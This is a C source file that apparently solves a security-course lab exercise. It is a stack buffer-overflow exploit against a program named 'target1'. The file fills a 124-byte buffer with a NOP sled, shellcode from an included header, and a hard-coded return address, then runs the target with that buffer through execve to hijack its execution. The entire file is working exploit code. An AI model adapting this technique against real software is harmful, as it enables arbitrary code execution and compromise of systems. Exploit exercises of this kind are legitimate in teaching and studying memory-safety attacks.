#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];
	char attackBuffer[124];
	int shellcode_length = 45;
	int i;
	for (i = 0; i < 120 - shellcode_length; i++){
		attackBuffer[i] = 0x90;	
	}
	for (i = 0; i < 46; i ++){
		attackBuffer[120 - shellcode_length + i] = shellcode[i];
	}
	*(unsigned *) & attackBuffer[120] = 0x3050fe10;


	for (i = 0; i < 124;){
		printf("%x\n", *(unsigned long *) &attackBuffer[i]);
		i = i + 4;
	}

	args[0] = TARGET;
	args[1] = attackBuffer;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}


